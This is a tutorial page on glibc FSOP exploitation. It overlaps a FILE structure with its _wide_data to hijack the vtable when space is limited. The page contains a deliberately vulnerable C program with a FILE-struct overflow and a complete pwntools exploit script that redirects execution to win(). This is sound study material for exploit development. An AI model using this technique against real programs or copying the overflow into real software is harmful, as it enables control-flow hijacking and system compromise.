#metadata(
  (
    title: "Overlapping Structures",
    description: "Exploiting FSOP with limited space by overlapping the FILE structure with the wide data structure using stable offset alignment.",
    date: "2026-01-02",
    order: 7,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Overlapping Structures: FSOP with Limited Space

In standard FSOP hijacking, we typically use a controlled heap buffer to store a fake `_wide_data` structure and its associated vtable. However, if we lack a heap leak or space is extremely constrained, we can trick Glibc into using the `FILE` structure itself as the wide data struct.

This "self-referential" overlap can be further optimized by shifting the `_wide_data` pointer to align its members with stable, unused fields in the `FILE` struct, avoiding fields like `_lock` that might be modified during execution.

== Vulnerable Scenario

The program provides a libc leak and the address of the `FILE` structure (`fp`). We have a direct overflow into `fp`.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

FILE *fp;
char *buf;

void win() { puts("Well done baby"); }

int main(int argc, char **argv, char **envp) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("libc leak: %p\n", puts);

  buf = malloc(0x100);
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "r");

  printf("fp leak: %p\n", fp);

  // Vulnerability: 0x1e0 bytes overflow into the FILE structure
  read(0, fp, 0x1e0);

  // Triggering the hijack
  fwrite(buf, 1, 0x100, fp);

  return 0;
}
```

== Exploit Strategy: Stable Alignment

=== Alignment Logic

1. *Stable Pointer Location*: We want to store the `_wide_vtable` pointer at `fp + 0x58` (unused space).
2. *Shifting `_wide_data`*: The `_wide_vtable` pointer resides at offset `0xE0` within the `_IO_wide_data` struct. To make `fp + 0xE0` point to our target, we set `_wide_data = fp + 0x58 - 0xE0 = fp - 0x88`.
3. *The Payload*:
  - `fp + 0x58`: Points back to `fp` (acts as the `_wide_vtable`).
  - `fp + 0x68`: Address of `win()` (called via `_wide_vtable + 0x68`).
  - `fp + 0x88`: `_lock` set to a writable region (e.g., `fp - 0x10`).

=== Offset Summary

#table(
  columns: (auto, auto, 1fr),
  inset: 10pt,
  align: (center, left, left),
  [*Offset*], [*FILE Field*], [*Overlapped Purpose*],
  [`0x58`], [Padding], [*`_wide_vtable` pointer*: Points back to `fp`],
  [`0x68`], [`_chain`], [*Target Jump*: `win()` (called via `_wide_vtable + 0x68`)],
  [`0x88`], [`_lock`], [*Writable Memory*: `fp - 0x10` (avoids payload corruption)],
  [`0xA0`], [`_wide_data`], [*Shifted Pointer*: `fp - 0x88` (aligns vtable with `0x58`)],
  [`0xD8`], [`vtable`], [*Entry Point*: `_IO_wfile_jumps - 0x20`],
)

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")
p = process(elf.path)
libc = elf.libc

# 1. Parse leaks
p.recvuntil(b"libc leak: ")
libc.address = int(p.recvline().strip(), 16) - libc.sym.puts
info(f"Libc base: {hex(libc.address)}")

p.recvuntil(b"fp leak: ")
fp_addr = int(p.recvline().strip(), 16)
info(f"FILE pointer (fp): {hex(fp_addr)}")

# 2. Construct the optimized self-overlapping payload
# We move the wide_vtable pointer to offset 0x58 (unused space) to avoid _lock corruption.
# Calculation: _wide_data + 0xE0 = fp_addr + 0x58 => _wide_data = fp_addr - 0x88
payload = flat(
    {
        0x58: fp_addr,                          # Acts as _wide_vtable pointer
        0x68: elf.sym.win,                      # _chain / doallocate target function
        0x88: fp_addr - 0x10,                   # _lock (must be writable)
        0xA0: fp_addr - 0x88,                   # _wide_data (shifted alignment)
        0xD8: libc.sym._IO_wfile_jumps - 0x20,  # vtable
    },
    filler=b"\x00",
)

p.sendline(payload)

p.interactive()
```

